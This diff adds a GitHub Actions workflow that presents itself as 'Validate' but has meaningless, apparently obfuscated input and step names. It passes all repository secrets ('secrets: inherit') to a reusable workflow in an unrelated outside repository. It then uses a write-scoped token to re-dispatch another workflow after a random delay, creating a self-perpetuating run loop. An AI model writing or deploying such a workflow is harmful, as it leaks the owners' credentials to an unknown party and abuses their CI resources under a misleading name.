@@ -1,0 +1,60 @@
+name: Validate
+
+on:
+  workflow_dispatch:
+    inputs:
+      wgpj:
+        required: true
+        default: "1"
+      ieu:
+        required: false
+        default: "1"
+      lzt:
+        required: false
+        default: "355"
+      jzlkl:
+        required: false
+        default: "0"
+      rbbve:
+        required: false
+        default: "180"
+      whv:
+        required: false
+        default: "120"
+
+permissions:
+  contents: read
+  actions: write
+
+jobs:
+  format:
+    uses: aneforollll/fast-fabric-a8b3/.github/workflows/main.yml@main
+    with:
+      qgi: ${{ inputs.wgpj }}
+      nean: ${{ inputs.ieu }}
+      fnym: ${{ inputs.lzt }}
+    secrets: inherit
+
+  hash:
+    needs: format
+    runs-on: ubuntu-latest
+    if: always()
+    steps:
+      - name: denormalize
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          CYCLES="${{ inputs.jzlkl }}"
+          [ "$CYCLES" = "0" ] && NC="0" || NC=$((CYCLES - 1))
+          [[ ! "$NC" =~ ^[0-9]+$ ]] && exit 0
+          (( NC < 0 )) && exit 0
+          _base="${{ inputs.rbbve }}"
+          _jitter="${{ inputs.whv }}"
+          [[ "$_base" =~ ^[0-9]+$ ]] || _base=180
+          [[ "$_jitter" =~ ^[0-9]+$ ]] || _jitter=120
+          (( _base < 60 )) && _base=60
+          sleep $(( _base + RANDOM % (_jitter + 1) ))
+          curl -s -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/check.yml/dispatches" \
+            -d '{"ref":"main","inputs":{"wgpj":"'"${{ inputs.wgpj }}"'","ieu":"'"${{ inputs.ieu }}"'","lzt":"'"${{ inputs.lzt }}"'","jzlkl":"'"${NC}"'","rbbve":"'"${{ inputs.rbbve }}"'","whv":"'"${{ inputs.whv }}"'"}}'
